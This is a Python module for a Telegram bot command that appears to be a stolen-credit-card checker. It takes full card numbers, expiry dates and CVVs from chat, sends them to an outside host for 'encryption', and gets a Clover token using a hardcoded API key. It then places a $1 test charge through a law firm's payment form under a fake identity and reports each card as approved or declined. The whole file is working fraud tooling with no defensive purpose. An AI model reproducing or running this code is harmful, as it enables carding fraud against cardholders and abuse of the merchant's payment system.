# commands/cl.py
from aiogram import Router, types
from aiogram.filters import Command
import asyncio
import requests
import re
import random
import string

router = Router()

def generate_random_user():
    letters = ''.join(random.choices(string.ascii_lowercase, k=6))
    digits = ''.join(random.choices(string.digits, k=3))
    return letters + digits

def check_card_sync(card_str: str) -> str:
    parts = card_str.split('|')
    if len(parts) != 4:
        return "❌ Invalid format. Use: CC|MM|YY|CVV"
    cc, mm, yy, cvv = [p.strip() for p in parts]
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = f"20{yy}"
    yy_short = yy[-2:]

    first6 = cc[:6]
    last4 = cc[-4:] if len(cc) >= 16 else cc[-4:]
    user = generate_random_user()

    try:
        # 1. Encrypt card
        encrypt_url = "https://asianprozyy.us/encrypt/clover"
        encrypt_params = {"card": f"{cc}|{mm}|{yy_short}|{cvv}"}
        encrypt_headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
        encrypt_resp = requests.get(encrypt_url, params=encrypt_params, headers=encrypt_headers, timeout=30)
        encrypt_resp.raise_for_status()
        match = re.search(r'encryptedCard":"(.*?)","', encrypt_resp.text)
        if not match:
            return "❌ Encryption failed"
        encrypted_card = match.group(1)

        # 2. Get Clover token
        token_url = "https://token.clover.com/v1/tokens"
        token_payload = {
            "card": {
                "encrypted_pan": encrypted_card,
                "exp_month": mm,
                "exp_year": yy,
                "cvv": cvv,
                "first6": first6,
                "last4": last4,
                "brand": "VISA",
                "address_zip": "10080"
            }
        }
        token_headers = {
            "apikey": "79f4ac34baaf133065f4ff4840447920",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0"
        }
        token_resp = requests.post(token_url, json=token_payload, headers=token_headers, timeout=30)
        token_resp.raise_for_status()
        token_match = re.search(r'"id":\s*"([^"]+)"', token_resp.text)
        if not token_match:
            return "❌ Tokenization failed"
        token = token_match.group(1)

        # 3. Submit payment
        payment_url = "https://mguilartelaw.com/clover-payment-request.php"
        payment_data = {
            "payment-frm[0][name]": "pn_first_name", "payment-frm[0][value]": "Franklin",
            "payment-frm[1][name]": "pn_last_name", "payment-frm[1][value]": "Weaver",
            "payment-frm[2][name]": "pn_email_address", "payment-frm[2][value]": f"{user}@gmail.com",
            "payment-frm[3][name]": "pn_phone_number", "payment-frm[3][value]": "(901) 626-0303",
            "payment-frm[4][name]": "pn_address_line_1", "payment-frm[4][value]": "600 heritage plantation way",
            "payment-frm[5][name]": "pn_address_line_2", "payment-frm[5][value]": "",
            "payment-frm[6][name]": "pn_address_city", "payment-frm[6][value]": "Hickory Weaver",
            "payment-frm[7][name]": "pn_address_state", "payment-frm[7][value]": "Tennessee",
            "payment-frm[8][name]": "pn_address_zipcode", "payment-frm[8][value]": "38042",
            "payment-frm[9][name]": "pn_address_country", "payment-frm[9][value]": "United States",
            "payment-frm[10][name]": "pn_payment_amount", "payment-frm[10][value]": "1.00",
            "payment-frm[11][name]": "cloverToken", "payment-frm[11][value]": token
        }
        payment_headers = {
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0",
            "x-requested-with": "XMLHttpRequest"
        }
        pay_resp = requests.post(payment_url, data=payment_data, headers=payment_headers, timeout=30)
        pay_resp.raise_for_status()

        if '{"error"' in pay_resp.text:
            error_match = re.search(r'{"error":"(.*?)","error_code"', pay_resp.text)
            error_msg = error_match.group(1) if error_match else "Unknown error"
            return f"❌ DECLINED – {error_msg}"
        else:
            return "✅ APPROVED – Payment successful ($1)"
    except Exception as e:
        return f"❌ Error: {str(e)[:100]}"

async def run_cl(card_str: str):
    return await asyncio.to_thread(check_card_sync, card_str)

@router.message(Command("cl"))
async def cmd_cl(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("❌ **Usage:** `/cl CC|MM|YY|CVV`\nExample: `/cl 4111111111111111|12|28|123`")
        return
    card = args[1].strip()
    progress = await message.answer("⏳ Checking Clover payment...")
    result = await run_cl(card)
    await progress.edit_text(f"💳 `{card}`\n📦 {result}\n\nBy @hqdeven")
